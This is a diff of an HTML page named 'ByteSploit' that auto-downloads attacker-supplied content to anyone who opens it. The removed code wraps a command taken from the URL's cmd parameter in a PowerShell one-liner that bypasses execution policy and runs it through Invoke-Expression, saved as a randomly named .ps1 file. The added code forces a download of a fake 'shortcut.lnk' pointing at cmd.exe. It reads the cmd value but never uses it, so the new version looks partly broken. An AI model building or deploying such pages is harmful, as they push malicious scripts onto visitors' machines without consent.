@@ -1,38 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
 	<title>ByteSploit</title>
+</head>
+<body>
 	<script>
-		function createPowerShellScript() {
-			// Get arguments from form input or URL
-			var urlParams = new URLSearchParams(window.location.search);
-			var urlcmd = urlParams.get('cmd');
-			if (urlcmd !== null) {
-				cmd = btoa(urlcmd); // Encode the cmd variable in base64
-			}
-			// Create PowerShell script content
-			var content = "powershell -ExecutionPolicy Bypass -Command \"[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + cmd + "'))\" | Invoke-Expression";
+		// Get the ?cmd= argument from the URL
+		const urlParams = new URLSearchParams(window.location.search);
+		const cmdArg = urlParams.get('cmd');
 
-			// Create Blob object
-			var blob = new Blob([content], { type: 'text/plain' });
+		// Convert the command from URL friendly to normal characters
+		const cmd = decodeURIComponent(cmdArg);
 
-			// Generate random filename
-			var filename = Math.random().toString(36).substring(2) + '.ps1';
+		// Set the content variable to the normal command
+		const content = cmd;
 
-			// Generate download URL and set it as the href of a link
-			var link = document.createElement('a');
-			link.download = filename;
-			link.href = URL.createObjectURL(blob);
-			link.click();
-		}
+		// Create a link element with the download attribute to automatically download the .lnk file
+		const link = document.createElement('a');
+		link.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent('[InternetShortcut]\nURL=file:///C:/Windows/System32/cmd.exe\nHotkey=162')); // Replace 'C:/Windows/System32/cmd.exe' with the path to cmd.exe on your system
+		link.setAttribute('download', 'shortcut.lnk');
 
-		// Set default value of cmd from URL and create PowerShell script
-		var urlParams = new URLSearchParams(window.location.search);
-		var urlcmd = urlParams.get('cmd');
-		if (urlcmd !== null) {
-			var cmd = btoa(urlcmd); // Encode the cmd variable in base64
-			createPowerShellScript();
-		}
+		// Append the link element to the body
+		document.body.appendChild(link);
+
+		// Simulate a click on the link element to trigger the download
+		link.click();
 	</script>
-	<body>
-	</body>
+</body>
 </html>
